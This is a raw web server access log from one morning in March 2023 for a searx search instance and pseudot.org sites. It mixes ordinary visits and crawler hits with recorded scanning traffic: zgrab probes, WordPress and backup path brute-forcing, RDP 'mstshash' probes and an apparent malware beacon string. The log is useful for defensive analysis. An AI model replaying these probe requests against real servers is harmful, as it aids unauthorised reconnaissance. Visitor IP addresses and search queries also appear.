2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 304 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
2a01:cb06:8057:eb5:4d84:d434:918a:dd4f - - [30/Mar/2023:08:21:14 +0000] "GET /searx/autocompleter?q=%D0%91%D0%BE%D1%85%D0%B0%20%D0%BD%D0%B5%D1%82%20wallpaper HTTP/1.1" 200 2 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/111 Mobile/15E148 Version/15.0"
143.110.222.166 - - [30/Mar/2023:08:28:22 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
113.108.9.38 - - [30/Mar/2023:08:30:40 +0000] "GET / HTTP/1.1" 200 415716 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
94.102.61.10 - - [30/Mar/2023:08:30:47 +0000] "GET / HTTP/1.1" 200 415947 "-" "python-requests/2.26.0"
143.110.190.16 - - [30/Mar/2023:08:51:13 +0000] "t\x81N\x1B,r\xE1\x8F\x02\xC7_\x0E\x11\x15vF" 400 157 "-" "-"
143.110.190.16 - - [30/Mar/2023:08:51:13 +0000] "GET /ab2g HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
143.110.190.16 - - [30/Mar/2023:08:51:14 +0000] "GET /ab2h HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
143.110.190.16 - - [30/Mar/2023:08:51:17 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.190.16 - - [30/Mar/2023:08:51:18 +0000] "GET / HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.190.16 - - [30/Mar/2023:08:51:18 +0000] "GET /private/api/v1/service/premaster HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.190.16 - - [30/Mar/2023:08:51:19 +0000] "GET /t4 HTTP/1.1" 404 125 "-" "Mozilla/5.0"
143.110.190.16 - - [30/Mar/2023:08:51:20 +0000] "GET /favicon.ico HTTP/1.1" 200 15406 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:56:59 +0000] "HEAD /wordpress HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:56:59 +0000] "HEAD /wordpress HTTP/1.1" 404 0 "http://photos.pseudot.org/wordpress" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:56:59 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:56:59 +0000] "HEAD / HTTP/1.1" 200 0 "http://photos.pseudot.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:56:59 +0000] "HEAD /wp HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:00 +0000] "HEAD /wp HTTP/1.1" 404 0 "http://photos.pseudot.org/wp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:00 +0000] "HEAD /bc HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:00 +0000] "HEAD /bc HTTP/1.1" 404 0 "http://photos.pseudot.org/bc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:00 +0000] "HEAD /bk HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:00 +0000] "HEAD /bk HTTP/1.1" 404 0 "http://photos.pseudot.org/bk" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:00 +0000] "HEAD /backup HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:00 +0000] "HEAD /backup HTTP/1.1" 404 0 "http://photos.pseudot.org/backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:01 +0000] "HEAD /old HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:01 +0000] "HEAD /old HTTP/1.1" 404 0 "http://photos.pseudot.org/old" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:01 +0000] "HEAD /new HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:01 +0000] "HEAD /new HTTP/1.1" 404 0 "http://photos.pseudot.org/new" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:01 +0000] "HEAD /main HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:02 +0000] "HEAD /main HTTP/1.1" 404 0 "http://photos.pseudot.org/main" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:02 +0000] "HEAD /home HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:08:57:02 +0000] "HEAD /home HTTP/1.1" 404 0 "http://photos.pseudot.org/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
31.220.1.83 - - [30/Mar/2023:09:06:42 +0000] "GET / HTTP/1.1" 200 415939 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /search?q=northkorean+life+tiktok HTTP/1.1" 200 7338 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/js/jquery.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/css/logicodev-dark.min.css HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/fonts/glyphicons-halflings-regular.woff2 HTTP/1.1" 200 18028 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [30/Mar/2023:09:11:10 +0000] "GET /searx/static/themes/oscar/img/favicon.png HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
193.32.162.159 - - [30/Mar/2023:09:11:27 +0000] "GET / HTTP/1.1" 200 415717 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.32.162.159 - - [30/Mar/2023:09:11:37 +0000] "GET /dispatch.asp HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.170.144.3 - - [30/Mar/2023:09:16:57 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
188.166.87.67 - - [30/Mar/2023:09:19:32 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 157 "-" "-"
188.166.87.67 - - [30/Mar/2023:09:19:33 +0000] "GET / HTTP/1.1" 200 216918 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
185.170.144.3 - - [30/Mar/2023:09:22:55 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
143.110.222.166 - - [30/Mar/2023:09:27:20 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
172.105.89.161 - - [30/Mar/2023:09:39:28 +0000] "\xAA\xAA\xAA\xAAUUUUUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAA" 400 157 "-" "-"
54.36.148.19 - - [30/Mar/2023:09:41:04 +0000] "GET /robots.txt HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.14 - - [30/Mar/2023:09:41:05 +0000] "GET / HTTP/1.1" 200 1970 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.18 - - [30/Mar/2023:09:41:07 +0000] "GET /IMAGES/gnubanner.gif HTTP/1.1" 200 2177 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.6 - - [30/Mar/2023:09:41:07 +0000] "GET /IMAGES/firefox3.gif HTTP/1.1" 200 3009 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.3 - - [30/Mar/2023:09:41:08 +0000] "GET /IMAGES/nokia64.gif HTTP/1.1" 200 558 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.11 - - [30/Mar/2023:09:41:08 +0000] "GET /IMAGES/vi.gif HTTP/1.1" 200 5815 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.7 - - [30/Mar/2023:09:41:09 +0000] "GET /IMAGES/2019.gif HTTP/1.1" 200 1629 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.9 - - [30/Mar/2023:09:41:09 +0000] "GET /CSS/style.css HTTP/1.1" 200 1157 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
69.167.12.20 - - [30/Mar/2023:09:52:04 +0000] "HEAD /wordpress HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:05 +0000] "HEAD /wordpress HTTP/1.1" 404 0 "http://programming.pseudot.org/wordpress" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:05 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:05 +0000] "HEAD / HTTP/1.1" 200 0 "http://programming.pseudot.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:05 +0000] "HEAD /wp HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:05 +0000] "HEAD /wp HTTP/1.1" 404 0 "http://programming.pseudot.org/wp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:05 +0000] "HEAD /bc HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:05 +0000] "HEAD /bc HTTP/1.1" 404 0 "http://programming.pseudot.org/bc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /bk HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /bk HTTP/1.1" 404 0 "http://programming.pseudot.org/bk" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /backup HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /backup HTTP/1.1" 404 0 "http://programming.pseudot.org/backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /old HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /old HTTP/1.1" 404 0 "http://programming.pseudot.org/old" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /new HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /new HTTP/1.1" 404 0 "http://programming.pseudot.org/new" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:06 +0000] "HEAD /main HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:07 +0000] "HEAD /main HTTP/1.1" 404 0 "http://programming.pseudot.org/main" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:07 +0000] "HEAD /home HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:09:52:07 +0000] "HEAD /home HTTP/1.1" 404 0 "http://programming.pseudot.org/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
34.254.146.137 - - [30/Mar/2023:09:55:11 +0000] "HEAD / HTTP/1.1" 301 0 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
95.142.118.18 - - [30/Mar/2023:09:55:28 +0000] "GET / HTTP/1.1" 200 415668 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
95.142.118.18 - - [30/Mar/2023:09:55:32 +0000] "GET /{} HTTP/1.1" 404 0 "http://dianamocanu.xyz" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
95.142.118.18 - - [30/Mar/2023:09:55:32 +0000] "GET /mobile HTTP/1.1" 401 0 "http://dianamocanu.xyz" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
95.142.118.18 - - [30/Mar/2023:09:55:33 +0000] "GET /%s HTTP/1.1" 400 157 "-" "-"
157.55.39.224 - - [30/Mar/2023:09:56:11 +0000] "GET / HTTP/1.1" 200 796 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:42 +0000] "HEAD /wordpress HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:43 +0000] "HEAD /wordpress HTTP/1.1" 404 0 "http://pseudot.org/wordpress" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:43 +0000] "HEAD / HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:43 +0000] "HEAD / HTTP/1.1" 200 0 "http://pseudot.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:43 +0000] "HEAD /wp HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:43 +0000] "HEAD /wp HTTP/1.1" 404 0 "http://pseudot.org/wp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:43 +0000] "HEAD /bc HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:43 +0000] "HEAD /bc HTTP/1.1" 404 0 "http://pseudot.org/bc" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /bk HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /bk HTTP/1.1" 404 0 "http://pseudot.org/bk" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /backup HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /backup HTTP/1.1" 404 0 "http://pseudot.org/backup" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /old HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /old HTTP/1.1" 404 0 "http://pseudot.org/old" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /new HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /new HTTP/1.1" 404 0 "http://pseudot.org/new" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /main HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:44 +0000] "HEAD /main HTTP/1.1" 404 0 "http://pseudot.org/main" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:45 +0000] "HEAD /home HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
69.167.12.20 - - [30/Mar/2023:10:03:45 +0000] "HEAD /home HTTP/1.1" 404 0 "http://pseudot.org/home" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
117.197.32.151 - - [30/Mar/2023:10:04:36 +0000] "GET / HTTP/1.1" 200 2826140 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
